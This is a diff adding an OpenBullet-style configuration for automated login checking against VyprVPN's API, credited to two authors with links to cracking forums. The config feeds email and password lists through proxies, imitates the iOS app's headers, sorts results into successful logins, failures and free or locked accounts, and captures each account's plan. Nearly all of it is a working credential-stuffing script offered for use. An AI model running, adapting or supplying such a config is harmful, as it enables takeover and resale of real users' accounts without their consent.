@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "vyprvpn_api",
+  "SuggestedBots": 125,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-04T07:16:05.194488+05:30",
+  "AdditionalInfo": "Bots 100-150 . Credits : parnex & Aiden",
+  "Author": "parnex & Aiden",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Email",
+  "AllowedWordlist2": "Email",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "X-GF-PLATFORM-VERSION: 12.0.1" 
+  HEADER "X-API-Features: partial_sign_up;" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "Accept: */*" 
+  HEADER "X-GF-PLATFORM: iOS" 
+  HEADER "locale: de_DE" 
+  HEADER "X-GF-DEVICE-NAME: iPhone" 
+  HEADER "password: <PASS>" 
+  HEADER "X-API-Version: 2" 
+  HEADER "username: <USER>" 
+  HEADER "User-Agent: VyprVPN/7327 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-GF-PRODUCT-VERSION: 3.0.0.7327" 
+  HEADER "X-GF-Agent: VyprVPN iOS 3.0.0.7327 (21a2ef40)" 
+
+#login_check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "confirmed\": true" 
+
+#plan PARSE "<SOURCE>" JSON "account_level_display" -> CAP "Plan" "" " | credits : parnex & Aiden" 
+
+#free_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "VyprVPN Free" 
+    KEY "<Plan>" DoesNotContain "Vypr" 
+    KEY "locked" 
+
+//made by parnex & Aiden
+Nulled : https://www.nulled.to/user/1515886-parnex
+Cracked : https://cracked.to/rolex0001
+
